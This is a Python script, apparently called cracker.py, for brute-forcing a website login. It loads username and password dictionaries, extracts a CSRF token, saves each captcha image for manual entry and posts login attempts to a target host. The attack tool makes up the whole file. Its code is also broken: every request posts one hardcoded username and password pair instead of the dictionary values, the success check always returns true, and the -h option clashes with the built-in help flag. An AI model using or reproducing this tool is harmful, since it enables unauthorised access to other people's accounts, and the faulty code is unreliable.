from optparse import OptionParser
import os
import requests
from bs4 import BeautifulSoup


def check_successfully(content):
    return True


if __name__ == '__main__':
    usage = "Using cracker.py to break login by brute force."
    parser = OptionParser(usage)
    parser.add_option('-h', '--host', dest="site", type="string")
    parser.add_option('-d', '--dict', dest="data_dict", type="string")
    parser.add_option('-u', '--user', dest="user_dict", type="string")
    parser.add_option('-p', '--pass', dest="pass_dict", type="string")

    options, args = parser.parse_args()

    site = options.site
    if site is None:
        print("You should specify target host by -h or --host")
        exit(-1)

    data_dict_path = options.data_dict

    user_dict_path = None
    pass_dict_path = None

    username_list = []
    password_list = []
    if data_dict_path is None:
        user_dict_path = options.user_dict
        pass_dict_path = options.pass_dict
        if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
            print("File %s or %s not found." % (data_dict_path, pass_dict_path))
            exit(-1)
        with open(user_dict_path, 'r') as user_dict:
            users = user_dict.read()
            username_list = users.split('\n')
        with open(pass_dict_path, 'r') as pass_dict:
            passwords = pass_dict.read()
            password_list = passwords.split('\n')
    else:
        if not os.path.exists(data_dict_path):
            print("File %s not found." % data_dict_path)
            exit(-1)
        with open(data_dict_path, 'r') as data_dict:
            data = data_dict.read()
            lines = data.split('\n')
            for line in lines:
                if len(line) > 2:
                    username = line.split(' ')[0]
                    password = line.split(' ')[1]
                    username_list.append(username)
                    password_list.append(password)

    s = requests.Session()
    page_content = s.get(site).content  # 获得 Session
    soup = BeautifulSoup(page_content, 'lxml')
    csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']

    # 开始爆破
    for index in range(len(username_list)):
        username = username_list[index]
        password = password_list[index]
        if len(username) <= 1 or len(password) <= 1:
            continue

        # 获得验证码的值
        image_data = s.get(site + 'get_captcha').content
        with open('image.png', 'wb') as image_file:
            image_file.write(image_data)
        captcha_code = input('Input code: ')

        # 这里进行爆破
        response = s.post(site + 'login', data={'csrf_token': csrf, 'username': 'tianzhijiao1119', 'password': '690847721',
                                                'captcha_code': captcha_code, 'submit': 'Login'})
        if check_successfully(response.content.decode()):
            print('Successfully! Username: %s, Password: %s' % (username, password))
            break
